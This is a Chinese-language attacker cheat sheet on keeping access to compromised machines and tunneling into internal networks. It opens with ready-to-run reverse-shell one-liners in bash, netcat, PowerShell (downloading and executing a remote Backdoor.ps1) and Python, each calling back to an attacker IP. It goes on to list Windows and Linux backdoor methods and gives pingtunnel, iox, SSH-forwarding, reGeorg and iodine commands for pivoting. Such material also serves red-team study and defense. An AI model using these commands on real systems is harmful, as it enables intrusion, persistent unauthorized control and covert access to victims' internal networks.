权限维持:
1.反弹shell:
#nc
attackhost:nc -lvp 9999
target:/bin/bash -i &> /dev/tcp/192.168.0.198/9999 <&1
​
#netcat
nc -e /bin/bash 192.168.0.198 9999
#powershell
将ps1放到attackhost上
powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999
#python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

2.webshell:
① 内存马隐藏
② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合

3.系统后门:
#Windows
① 利用任务计划定时反弹会话
② 利用开机启动项
③ 影子账户以及guest账户
④ 注册表
⑤ 系统工具后门（shift后门）
⑥ WMI后门
⑦ DLL劫持
⑧ 进程注入
​
#Linux
① ssh、openssh后门
② 任务计划
③ VIM后门
④ 添加超级用户
⑤ SUID后门
⑥ 利用自启动程序
⑦ rootkit后门

4.利用IIS等服务制作后门维持权限:
常用隧道建立工具
4.1 探测是否出网:
ICMP：ping IP；
TCP：nc -zv ip 端口；
HTTP：curl www.xxx；
DNS：nslookup www.baidu.com attackhost-ip。

4.2 网络层常用隧道:
4.2.1 pingTunnel
github：https://github.com/esrrhs/pingtunnel
#安装：
安装服务器：首先准备一个有公网IP的服务器，比如AWS上的EC2，假设域名或者公网IP是www.yourserver.com从releases下载对应的安装包，如pingtunnel_linux64.zip，然后解压并以root权限执行 sudo wget (link of latest release) sudo unzip pingtunnel_linux64.zip sudo ./pingtunnel -type server （可选）禁用系统默认 ping echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all；
安装客户端：从releases下载对应的安装包，如pingtunnel_windows64.zip，解压 然后以管理员权限运行。不同转发功能对应的命令如下。 如果看到ping pong的日志，则连接正常
使用：

Forward sock5
pingtunnel.exe -type client -l: 4455 -s www.yourserver.com -sock5 1
Forward tcp
pingtunnel.exe -type client -l: 4455 -s www.yourserver.com -t www.yourserver.com:4455 -tcp 1
Forward udp
pingtunnel.exe -type client -l: 4455 -s www.yourserver.com -t www.yourserver.com:4455
4.2.2 IPv6隧道

#kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。
#使用：
首先开启目标机上的IPV6,ipconfig查看ipv6地址
kali：6tunnel -4 80 targetipv6IP 80   #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务；

4.3 传输层常用隧道:
#4.3.1 IOX
github：https://github.com/EddieIvan01/iox
#使用，比如我们将内网的3389端口转发到我们的attackhost：
target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565   #-k启用加密
vps:./iox fwd -l *8888 -l 33890 -k 656565
socks代理

修改/etc/proxychains.conf

在本地0.0.0.0:1080启动Socks5服务

./iox proxy -l 1080
在被控机开启Socks5服务，将服务转发到公网attackhost

在attackhost上转发0.0.0.0:9999到0.0.0.0:1080

你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连

./iox proxy -r 1.1.1.1:9999
./iox proxy -l 9999 -l 1080       // 注意，这两个端口是有顺序的
接着连接内网主机

# proxychains.conf
# socks5://1.1.1.1:1080
​
$ proxychains rdesktop 192.168.0.100:3389

4.4 应用层常用隧道:
#4.4.1 SSH
#SSH常用参数：
-C 压缩传输
-f 后台执行SSH
-N 建立静默连接
-g 允许远程主机连接本地用于转发的端口
-L 本地端口转发
-R 远程端口转发
-D 动态转发
-P 指定SSH端口
#4.4.2 本地端口转发
//攻击机：192.168.1.1  web服务器：192.168.1.2  数据库服务器：192.168.1.3,攻击机无法访问数据库服务器，但可以访
问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景

攻击机执行：ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22  //攻击机去连接web服务器，连上之后由
web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面

#4.4.3 远程转发
//攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，
web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口

在web服务器上执行：ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1
此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面

#4.4.4 动态转发
① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2
② 本地设置socks代理后即可访问数据库服务器

4.5 HTTP（reGeorge）:
github：https://github.com/sensepost/reGeorg
#使用：
① 将tunnel. (aspx|ashx|jsp|php) 上传到网络服务器上传至web服务器网站，外部访问测试；
② 攻击机运行：python reGeorgSocksProxy.py -p 2022 -u http://192.168.1.2/tunnel.(aspx|ashx|jsp|php) #表示本地2022端口的流量都转发给指定的URL；
③ vim /etc/proxychains.conf修改proxychains的配置文件，将代理设置成本机2022端口；
④ proxychains command  //访问内网业务

4.6 DNS（iodine）:
github：https://github.com/yarrick/iodine
要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined；
部署使用参考文章：https://cloud.tencent.com/developer/article/1937092